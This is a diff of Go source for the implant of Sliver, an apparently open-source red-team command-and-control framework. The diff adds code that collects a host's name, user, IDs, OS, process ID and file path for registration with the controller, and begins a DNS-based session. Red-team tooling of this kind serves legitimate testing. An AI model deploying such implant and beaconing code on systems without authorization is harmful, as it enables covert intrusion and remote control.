@@ -5,6 +5,8 @@ import (
 	"flag"
 	"io"
 	"os"
+	"os/user"
+	"runtime"
 
 	// {{if .Debug}}
 	// {{else}}
@@ -16,6 +18,8 @@ import (
 	"time"
 
 	pb "sliver/protobuf"
+
+	"github.com/golang/protobuf/proto"
 )
 
 var (
@@ -107,7 +111,7 @@ func mtlsConnect() error {
 		return err
 	}
 	defer conn.Close()
-	registerSliver(conn)
+	mtlsRegisterSliver(conn)
 
 	send := make(chan pb.Envelope)
 	defer close(send)
@@ -137,7 +141,13 @@ func dnsConnect() error {
 	// {{if .Debug}}
 	log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
 	// {{end}}
-
+	sessionID, _, err := dnsStartSession(dnsParent)
+	if err != nil {
+		return err
+	}
+	// {{if .Debug}}
+	log.Printf("Starting new session with id = %s\n", sessionID)
+	// {{end}}
 	return nil
 }
 
@@ -155,6 +165,27 @@ func getReconnectInterval() time.Duration {
 		return 30 * time.Second
 	}
 	return time.Duration(reconnect) * time.Second
+}
+
+func getRegisterSliver() pb.Envelope {
+	hostname, _ := os.Hostname()
+	currentUser, _ := user.Current()
+	data, _ := proto.Marshal(&pb.RegisterSliver{
+		Name:     sliverName,
+		Hostname: hostname,
+		Username: currentUser.Username,
+		Uid:      currentUser.Uid,
+		Gid:      currentUser.Gid,
+		Os:       runtime.GOOS,
+		Arch:     runtime.GOARCH,
+		Pid:      int32(os.Getpid()),
+		Filename: os.Args[0],
+	})
+	envelope := pb.Envelope{
+		Type: pb.MsgRegister,
+		Data: data,
+	}
+	return envelope
 }
 
 // rootOnlyVerifyCertificate - Go doesn't provide a method for only skipping hostname validation so
